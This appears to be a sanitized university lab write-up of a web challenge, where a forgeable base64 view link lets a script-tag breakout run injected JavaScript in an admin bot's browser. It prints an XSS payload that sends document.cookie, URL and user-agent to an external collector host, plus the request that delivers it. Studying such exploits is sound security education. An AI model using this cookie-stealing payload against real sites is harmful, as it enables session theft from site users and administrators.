# Historical report: Fetch Script Context

> Sanitized archival COMP6443 lab writeup. The larger assessment is team work; no exclusive individual authorship is inferred. Reported success is historical and has not been freshly reproduced. Addresses, accounts, identities, flags, encoded evidence, and screenshots are omitted or replaced. Code is illustrative and may contain draft errors. Read [review notes](../docs/report-review-notes.md).

# Fetch 20 Writeup

## Challenge overview

This challenge provides a tutor feedback site at `https://lab.example.invalid`. The home page contains two drop-down boxes, one for the tutor name and one for the feedback text. Submitting the form sends a JSON request to `/` and the server returns a `/view/<base64>` URL.

A normal request looks like this:

```http
POST / HTTP/2
Host: lab.example.invalid
Content-Type: application/json

{"who":"hamish","why":"great"}
```

The response contains a view link:

```json
{"success":"The admin will read your feedback promptly! You can view it yourself at https://lab.example.invalid/view/..."}
```

This message is the key hint. It tells us that an administrator or bot will later open the feedback page.

## Initial analysis

Opening a normal `/view/...` page shows that the feedback values are rendered both into HTML and into an inline script. A simplified version of the page source is:

```html
<h2>hamish</h2>
<p>great</p>

<script>
    const getValues = () => {
        return {
            who: 'hamish',
            why: document.querySelectorAll('select')[0].value
        }
    }
</script>
```

This is important because `who` is inserted inside a JavaScript string literal in the inline `<script>` block.

## Key observation: the `/view/<base64>` link is forgeable

The value after `/view/` is just base64-encoded JSON. It is not signed and it does not appear to be backed by a database lookup. That means an attacker can generate arbitrary view links by encoding chosen `who` and `why` values.

For example, the following JavaScript in the browser console produces a custom link:

```js
btoa(JSON.stringify({ who: "test", why: "great" }))
```

This lets us test arbitrary payloads without relying on the front-end drop-down restrictions.

## Failed approaches

Direct HTML injection into `why` does not work because the page escapes HTML in the visible output. For example, injecting:

```html
<img src=x onerror=alert(1)>
```

results in source like:

```html
<p>&lt;img src=x onerror=alert(1)&gt;</p>
```

A simple quote-breaking payload in `who` also fails:

```text
x';alert(1);//
```

because it breaks the object literal syntax inside the script before the payload can execute.

## Vulnerability

The real issue is that `who` is inserted into an inline `<script>` block without safely handling `</script>`. This makes it possible to terminate the original script tag and start a new attacker-controlled script.

A working proof-of-concept payload for `who` is:

```html
</script><script>alert(1)</script>
```

When this value is rendered inside the page source, the browser closes the original script block and executes the injected one. The rest of the original JavaScript then appears as plain text in the page, confirming that the script context has been broken successfully.

This is therefore a reflected XSS through the forged `/view/<base64>` page, with execution occurring in a page that the administrator is expected to open.

## Exploitation strategy

Because the server explicitly states that the admin will read the feedback promptly, the goal is to make the admin open a malicious `/view/...` link and then exfiltrate sensitive data from the admin browser.

The initial payload used for exfiltration was:

```html
</script><script>new Image().src='https://collector.example.invalid/REDACTED?stage=fetch1&c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)+'&ua='+encodeURIComponent(navigator.userAgent)</script>
```

This payload does three things:

1. Closes the original script tag.
2. Executes a new attacker-controlled script.
3. Sends the administrator's cookie, current URL, and user-agent to an external webhook.

## Delivery

The payload can be submitted through the JSON feedback endpoint by setting it as the `who` field:

```http
POST / HTTP/2
Host: lab.example.invalid
Content-Type: application/json

{
  "who": "</script><script>new Image().src='https://collector.example.invalid/REDACTED?stage=fetch1&c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)+'&ua='+encodeURIComponent(navigator.userAgent)</script>",
  "why": "great"
}
```

The server then returns a malicious `/view/<base64>` URL. When the administrator or headless bot opens that page, the JavaScript executes automatically.

## Result

The webhook received a request from a headless browser, proving that the payload executed in the administrator context. The request included:

- `stage=fetch1`
- `c=flag=[REDACTED LAB FLAG]`
- a `HeadlessChrome` user-agent
- the forged `/view/...` URL in the `u` parameter

The important point is that the flag was present directly in `document.cookie`, so no additional internal fetches were needed.

## Root cause

The vulnerability exists because:

1. User-controlled input is embedded inside an inline script block.
2. The application does not safely neutralize `</script>` before insertion.
3. The `/view/<base64>` mechanism trusts attacker-controlled content.
4. The admin is expected to open attacker-supplied feedback pages.

This combination makes exploitation straightforward.

## Security impact

An attacker can execute arbitrary JavaScript in the administrator's browser when they review feedback. Depending on what is stored in the page or browser context, this can lead to session theft, data exfiltration, or further same-origin actions. In this challenge, the immediate impact is disclosure of the administrator's flag from `document.cookie`.

## Conclusion

The challenge is solved by forging a `/view/<base64>` page in which `who` contains a `</script><script>...</script>` payload. Once the admin reads the feedback, the injected JavaScript runs in the admin browser and exfiltrates the cookie to the attacker. Since the flag is stored in that cookie, the first successful exfiltration is enough to complete the challenge.
